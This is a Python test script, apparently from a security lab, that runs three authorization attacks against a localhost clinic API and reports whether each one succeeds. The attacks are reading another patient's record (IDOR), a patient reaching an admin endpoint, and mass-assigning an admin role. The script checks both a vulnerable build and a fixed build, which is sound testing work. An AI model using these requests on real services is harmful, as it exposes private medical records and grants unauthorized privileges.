"""attack.py - D19: three authorization attacks against the clinic API.

Usage:   python attack.py [base_url]        (default http://127.0.0.1:5000)
Run it IDENTICALLY against the vulnerable app and the fixed app; only the
server behind the URL changes. Test data only. Localhost only.

Attacker: thabo (a patient).  Verifier: sysadmin, used only to read the truth.
"""
import sys

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000").rstrip("/")
if not BASE.startswith(("http://127.0.0.1", "http://localhost")):
    sys.exit("Refused: this script only targets localhost.")


def login(username: str, password: str) -> requests.Session:
    session = requests.Session()
    resp = session.post(f"{BASE}/login",
                        json={"username": username, "password": password},
                        timeout=5)
    if resp.status_code != 200:
        sys.exit(f"Setup failed: could not log in as {username} ({resp.status_code}).")
    return session


def safe_json(resp: requests.Response):
    try:
        return resp.json()
    except ValueError:
        return None


def report(label: str, what: str, status: int, succeeded: bool, extra: str = "") -> None:
    verdict = "SUCCEEDED (app is vulnerable)" if succeeded else "REFUSED"
    print(f"{label} | {what}")
    print(f"    status={status} | {verdict}{extra}")


print(f"Target: {BASE}")
print("Attacker: thabo (patient). Test data only.")
print("-" * 60)

thabo = login("thabo", "thabo-pass")
succeeded = 0

# Attack A: read another patient's record (IDOR / broken object-level authorisation)
resp = thabo.get(f"{BASE}/records/2", timeout=5)
body = safe_json(resp) or {}
hit = resp.status_code == 200 and body.get("patient_id") == 2
succeeded += hit
report("ATTACK A", "thabo GET /records/2 (Naledi's record)", resp.status_code, hit)

# Attack B: reach an admin-only endpoint as a patient (vertical escalation)
resp = thabo.get(f"{BASE}/admin/users", timeout=5)
hit = resp.status_code == 200 and isinstance(safe_json(resp), list)
succeeded += hit
report("ATTACK B", "thabo GET /admin/users", resp.status_code, hit)

# Attack C: mass assignment, try to make himself admin.
# The PUT status is NOT trusted: a separate admin session reads thabo's real role.
resp = thabo.put(f"{BASE}/profile", json={"role": "admin"}, timeout=5)
put_status = resp.status_code
verifier = login("sysadmin", "admin-pass")
users = safe_json(verifier.get(f"{BASE}/admin/users", timeout=5)) or []
real_role = next((u["role"] for u in users if u["username"] == "thabo"), "unknown")
hit = real_role == "admin"
succeeded += hit
report("ATTACK C", 'thabo PUT /profile {"role":"admin"}', put_status, hit,
       f" | thabo's real role afterwards: {real_role}")

print("-" * 60)
print(f"Attacks succeeded: {succeeded}/3")